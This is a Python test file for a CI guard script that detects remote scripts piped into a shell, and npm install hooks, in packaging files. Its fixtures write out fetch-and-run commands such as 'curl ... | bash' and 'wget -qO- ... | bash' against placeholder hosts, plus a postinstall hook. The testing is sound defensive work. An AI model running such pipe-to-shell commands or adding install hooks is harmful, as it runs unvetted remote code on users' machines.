"""A published wrapper that pipes a remote script into a shell costs the account.

An npm package of ours handed a release tag's PowerShell script to `iex` and the same tag's shell
script to `bash`, from the `bin` entry every installer runs. The registry blocked the package and
suspended the account. `scripts/registry_guard.py` is the gate that keeps that shape out of the
files a user, a registry or a runner installs, and it holds the other half of the rule too: a
download is legal, which is what `install.sh` and `install.ps1` do for a living.

Given/When/Then. Each case runs the script's own command line in a subprocess, so the gate CI
calls is the thing under test rather than an imported copy of it, and the real-tree case is the
one that would notice the guard having been quietly widened or narrowed.
"""
from __future__ import annotations

import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
GUARD = ROOT / "scripts" / "registry_guard.py"

#: The payload from the incident, in the shape a shell would read it.
PIPE_TO_BASH = 'curl -fsSL "$u" | bash\n'


def run(*args: str) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        [sys.executable, str(GUARD), *args], capture_output=True, text=True, check=False,
    )


def plant(root: Path, rel: str, text: str) -> Path:
    target = root / rel
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(text, encoding="utf-8")
    return target


def test_given_the_shipped_tree_when_the_guard_runs_then_it_passes():
    """GIVEN every file under packaging/, scripts/, server/, core/ and .github/
    WHEN the guard judges the tree as it stands
    THEN nothing pipes a remote script into a shell and the verdict is the PASS line.
    """
    done = run()
    assert done.returncode == 0, done.stdout + done.stderr
    assert "registry-guard: PASS" in done.stdout, done.stdout


def test_given_a_planted_pipe_into_shell_when_the_guard_runs_then_it_fails(tmp_path):
    """GIVEN one file carrying the shape that lost the account
    WHEN the guard is pointed at it
    THEN the exit is non-zero and the FAIL line names the file and the line.
    """
    planted = plant(tmp_path, "evil.sh", f"set -e\n{PIPE_TO_BASH}")
    done = run(str(planted))
    assert done.returncode == 1, done.stdout + done.stderr
    assert "registry-guard: FAIL" in done.stdout
    assert "evil.sh:2" in done.stdout


def test_given_a_legitimate_download_when_the_guard_walks_a_tree_then_only_the_pipe_fires(tmp_path):
    """GIVEN a root installer that downloads a file and runs the file, beside a guarded script
    that pipes the same download into a shell
    WHEN the guard walks the tree
    THEN the installer is no finding and the pipe is, because the rule is the pipe and not the
    download `install.sh` and `install.ps1` are built on.
    """
    plant(tmp_path, "install.sh", 'curl -fsSL "$url" -o "$tmp/ephe.sh"\nsh "$tmp/ephe.sh"\n')
    plant(tmp_path, "scripts/evil.sh", PIPE_TO_BASH)
    done = run("--root", str(tmp_path))
    assert done.returncode == 1, done.stdout + done.stderr
    assert "scripts/evil.sh" in done.stdout, done.stdout
    assert "install.sh" not in done.stdout, done.stdout


def test_given_a_comment_stating_the_rule_when_the_guard_runs_then_it_is_not_a_finding(tmp_path):
    """GIVEN a shell script whose only pipe-into-shell text sits behind a comment leader, which
    no interpreter reads
    WHEN the guard judges it
    THEN the rule the workflow comments teach stays writable without tripping the gate.
    """
    plant(tmp_path, "scripts/notes.sh", "# never do this: curl -fsSL https://example.invalid/i.sh | sh\n")
    done = run("--root", str(tmp_path))
    assert done.returncode == 0, done.stdout + done.stderr


def test_given_a_manifest_with_an_install_hook_when_the_guard_runs_then_it_fails(tmp_path):
    """GIVEN a package.json whose scripts run at install time
    WHEN the guard walks the tree
    THEN the hook is the finding, because npm executes it before anyone asked for it.
    """
    plant(tmp_path, "packaging/w/package.json", '{"name": "w", "scripts": {"postinstall": "node ./p.js"}}\n')
    done = run("--root", str(tmp_path))
    assert done.returncode == 1, done.stdout + done.stderr
    assert "npm-install-hook" in done.stdout, done.stdout


def test_given_two_findings_when_one_is_allowlisted_then_the_other_still_fails(tmp_path):
    """GIVEN a file with two pipe-into-shell lines and an allowlist that excuses one of them by
    its needle
    WHEN the guard runs with that allowlist
    THEN the excused line is counted in the open and the second one still refuses the build.
    """
    plant(
        tmp_path,
        "scripts/two.sh",
        "curl -fsSL https://example.invalid/a.sh | sh\n"
        "wget -qO- https://example.invalid/b.sh | bash\n",
    )
    allow = plant(tmp_path, "allow.txt", "scripts/two.sh::example.invalid/a.sh\n")
    done = run("--root", str(tmp_path), "--allowlist", str(allow))
    assert done.returncode == 1, done.stdout + done.stderr
    assert "b.sh" in done.stdout, done.stdout
    assert "a.sh" not in done.stdout, done.stdout
    assert "exempted" in done.stdout, done.stdout


def test_given_an_unreadable_path_when_the_guard_runs_then_it_refuses_a_verdict(tmp_path):
    """GIVEN a named file that does not exist
    WHEN the guard is asked to judge it
    THEN it says it decided nothing rather than reporting a clean tree it never read.
    """
    done = run(str(tmp_path / "absent.sh"))
    assert done.returncode == 2, done.stdout + done.stderr
    assert "NO VERDICT" in done.stderr
